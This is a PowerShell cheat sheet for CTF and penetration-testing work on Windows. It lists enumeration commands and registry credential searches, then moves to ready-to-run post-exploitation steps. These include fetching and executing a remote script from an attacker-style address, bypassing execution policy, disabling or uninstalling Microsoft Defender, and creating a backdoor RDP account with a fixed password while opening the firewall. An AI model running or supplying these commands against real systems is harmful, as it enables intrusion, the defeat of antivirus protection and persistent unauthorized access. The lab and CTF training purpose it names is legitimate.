
=== CORE Ps1 COMMANDS FOR CTF/PENTESTING ===


1. Basic System Enumeration
whoami
hostname
systeminfo
Get-ComputerInfo
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators

2. File & Directory Recon
dir
ls
Get-ChildItem -Recurse
Get-Content file.txt
type file.txt
 *Search for interesting files
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config -Recurse -ErrorAction SilentlyContinue

3. Permissions & Privilege Checks
whoami /priv
whoami /groups
 *Check for file permissions
icacls file.exe

4. Processes & Services (Very Important in HTB
Get-Process
Get-Service
Get-Service | Where-Object {$_.Status -eq "Running"}
 *Look for weak services
Get-WmiObject win32_service | Select Name, StartName, PathName

5. Network Enumeration
ipconfig
netstat -ano
arp -a
route print
Get-NetTCPConnection
Get-NetIPAddress

6. User & Credential Hunting
cmdkey /list
 *Search registry for creds
reg query HKLM /f password /t REG_SZ /s

7.File Download / Upload (CTF Essential)
Invoke-WebRequest http://10.10.14.1/file.exe -OutFile file.exe
*Shortened 
iwr http://10.10.14.1/file.ps1 -o file.ps1

8. Script Execution (Common in PrivEsc)
powershell -ExecutionPolicy Bypass -File script.ps1
or
iex (iwr http://10.10.14.1/script.ps1)

9. Encoding & Decoding (Payload Stuff)
 *Encode
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("text"))
 *Decode
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("encoded"))

10. Environment & Variables
Get-ChildItem Env:
echo $env:USERNAME
echo $env:PATH
Get-MpComputerStatus

11. AV & Defender Checks
Get-MpComputerStatus
Get-MpPreference

12. Disable Defender Real-Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

13. Disable Defender All Major Features
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true

14. Check if everything (services) is off
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected
( RealTimeProtectionEnabled: Should be False.
AntivirusEnabled: Should be False. )

15. Uninstall Defender (Windows Server Only)
Uninstall-WindowsFeature -Name Windows-Defender

#RDP
1. Define the user and the password directly
$UserName = "RDP_User"
$Pass = ConvertTo-SecureString "SecurePass123!" -AsPlainText -Force

2. Create the user
New-LocalUser -Name $UserName -Password $Pass -FullName "Remote Access"

3. Add to the RDP group
Add-LocalGroupMember -Group "Remote Desktop Users" -Member $UserName

4. Open the 'Remote Desktop' door
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

5. Delete account entirely 
Remove-LocalUser -Name "RDP_User"

6. Revoke RDP Access only (Keep the user)
Remove-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP_User"

#View RDP Accounts
1. See All Local Accounts
Get-LocalUser

2. See ONLY the RDP "VIP List"
Get-LocalGroupMember -Group "Remote Desktop Users"

3. The "Search and Find" (For specific names)
Get-LocalUser -Name "RDP_User*"


=============================


"...Keep on learning
 Keep on training 
 Keep on getting smarter"
- Oliver Queen
Arrow (U.S. TV series)












